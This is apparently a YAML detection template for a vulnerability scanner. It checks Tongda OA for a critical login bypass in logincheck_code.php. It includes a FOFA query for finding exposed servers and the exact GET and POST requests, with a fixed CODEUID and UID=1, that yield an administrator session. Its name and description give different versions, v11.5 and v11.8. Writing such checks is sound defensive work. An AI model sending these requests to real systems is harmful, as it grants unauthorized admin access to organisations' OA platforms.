id: tongda-v11-session-disclosure-login-bypass

info:
  name: 通达OA v11.5 logincheck_code.php 登陆绕过漏洞
  author: zan8in
  severity: critical
  verified: true
  description: |
    通达OA v11.8 logincheck_code.php存在登陆绕过漏洞，通过漏洞攻击者可以登陆系统管理员后台
    fofa: app="TDXK-通达OA"
  tags: tongda,oa,logincheck,code,bypass
  created: 2025/03/13

rules:
  r0:
    request:
      method: GET
      path: /general/login_code.php
    expression: response.status == 200 && response.headers["content-type"].contains("image/png")
  r1:
    request:
      method: POST
      path: /logincheck_code.php
      body: |
        CODEUID=%7BD384F12E-A758-F44F-8A37-20E2568306A7%7D&UID=1
    expression: response.status == 200 && response.body.bcontains(b'"status":')  && response.body.bcontains(b'"msg":') && response.body.bcontains(b'"url":') && response.body.bcontains(b'index.php?isIE=0')
expression: r0() && r1()
